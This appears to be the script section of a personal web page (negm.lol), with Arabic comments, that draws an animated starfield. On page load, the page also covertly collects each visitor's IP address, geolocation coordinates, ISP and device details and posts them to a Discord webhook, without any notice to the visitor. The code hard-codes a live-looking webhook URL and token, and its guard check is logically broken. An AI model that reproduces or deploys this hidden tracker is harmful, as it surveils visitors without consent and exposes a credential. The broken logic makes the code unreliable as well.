<body>

  <script>
    // ضع webhook الخاص بك هنا
    const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // ضع الـ webhook بتاعك هنا
    
    // دالة لجمع معلومات الزائر
    async function getVisitorInfo() {
      try {
        // User Agent
        const userAgent = navigator.userAgent;
        
        // IP و Location من ipapi.co (مجاني)
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        // معلومات الجهاز
        const screenRes = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        const platform = navigator.platform;
        
        // Timestamp
        const timestamp = new Date().toISOString();
        
        return {
          ip: ipData.ip || 'Unknown',
          city: ipData.city || 'Unknown',
          region: ipData.region || 'Unknown',
          country: ipData.country_name || 'Unknown',
          country_code: ipData.country_code || 'Unknown',
          latitude: ipData.latitude || 'Unknown',
          longitude: ipData.longitude || 'Unknown',
          isp: ipData.org || 'Unknown',
          userAgent: userAgent,
          screen: screenRes,
          timezone: timezone,
          language: language,
          platform: platform,
          timestamp: timestamp,
          url: window.location.href
        };
      } catch (error) {
        console.log('Error getting visitor info:', error);
        return null;
      }
    }
    
    // دالة إرسال البيانات للـ Discord
    async function sendToDiscord(data) {
      if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/1483455055284932660/Mx5n24RbM3bY2nxuABkYno3yUArCzCD8B2oHnEsJbP4fyGHFhX7fbZ1_Hi3tkUV06wzg') {
        return; // ما نبعتش لو مافيش webhook
      }
      
      const embed = {
        title: `🕵️ New Visitor - negm.lol`,
        color: 0x00ff00,
        fields: [
          { name: '🌐 IP Address', value: `\`${data.ip}\``, inline: true },
          { name: '📍 Location', value: `${data.city}, ${data.region}, ${data.country} (${data.country_code})`, inline: true },
          { name: '📡 ISP', value: `\`${data.isp}\``, inline: true },
          { name: '🌍 Coordinates', value: `\`${data.latitude}, ${data.longitude}\``, inline: true },
          { name: '🖥️ Screen Resolution', value: `\`${data.screen}\``, inline: true },
          { name: '🌐 Timezone', value: `\`${data.timezone}\``, inline: true },
          { name: '🗣️ Language', value: `\`${data.language}\``, inline: true },
          { name: '💻 Platform', value: `\`${data.platform}\``, inline: true },
          { name: '🔗 Visited URL', value: `[${data.url}](${data.url})`, inline: false },
          { name: '⏰ Timestamp', value: `<t:${Math.floor(new Date(data.timestamp).getTime() / 1000)}:F>`, inline: false }
        ],
        thumbnail: {
          url: `https://ipapi.co/assets/images/flags/${data.country_code?.toLowerCase()}.png`
        },
        footer: {
          text: `User Agent: ${data.userAgent.substring(0, 100)}...`
        }
      };
      
      const payload = {
        embeds: [embed]
      };
      
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });
      } catch (error) {
        console.log('Error sending to Discord:', error);
      }
    }
    
    // تشغيل الكود لما الصفحة تحمل
    window.addEventListener('load', async () => {
      const visitorInfo = await getVisitorInfo();
      if (visitorInfo) {
        await sendToDiscord(visitorInfo);
      }
    });

    // باقي كود الـ canvas والنجوم
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    let width, height;
    let stars = [];
    let particles = [];

    function resize() {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    class Star {
      constructor() {
        this.x = Math.random() * width;
        this.y = Math.random() * height * 2;
        this.size = Math.random() * 1.3 + 0.4;
        this.twinkleSpeed = Math.random() * 0.02 + 0.008;
      }
      update() {
        this.brightness = 0.18 + Math.sin(Date.now() * this.twinkleSpeed) * 0.1;
      }
      draw() {
        ctx.fillStyle = `rgba(140, 140, 140, ${this.brightness})`;
        ctx.shadowBlur = 3;
        ctx.shadowColor = '#333333';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    class Particle {
      constructor() {
        this.x = Math.random() * width;
        this.y = Math.random() * height * 2;
        this.size = Math.random() * 1.6 + 0.5;
        this.speedX = Math.random() * 0.3 - 0.15;
        this.speedY = Math.random() * 0.3 - 0.15;
      }
      update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.x < 0 || this.x > width) this.speedX *= -1;
        if (this.y < 0 || this.y > height * 2) this.speedY *= -1;
      }
      draw() {
        ctx.fillStyle = '#333333';
        ctx.shadowBlur = 5;
        ctx.shadowColor = '#222222';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    function init() {
      stars = [];
      particles = [];
      for (let i = 0; i < 160; i++) stars.push(new Star());
      for (let i = 0; i < 30; i++) particles.push(new Particle());
    }

    function connect() {
      ctx.strokeStyle = 'rgba(60, 60, 60, 0.025)';
      ctx.lineWidth = 0.4;
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.hypot(dx, dy);
          if (dist < 180) {
            ctx.globalAlpha = (180 - dist) / 180 * 0.2;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }
      ctx.globalAlpha = 1;
    }

    function animate() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.22)';
      ctx.fillRect(0, 0, width, height);

      stars.forEach(s => { s.update(); s.draw(); });
      particles.forEach(p => { p.update(); p.draw(); });

      connect();

      requestAnimationFrame(animate);
    }

    init();
    animate();

    console.log('%cnegm.lol - Pure Black with Scroll Loaded', 'color:#555555; font-size:15px;');
  </script>
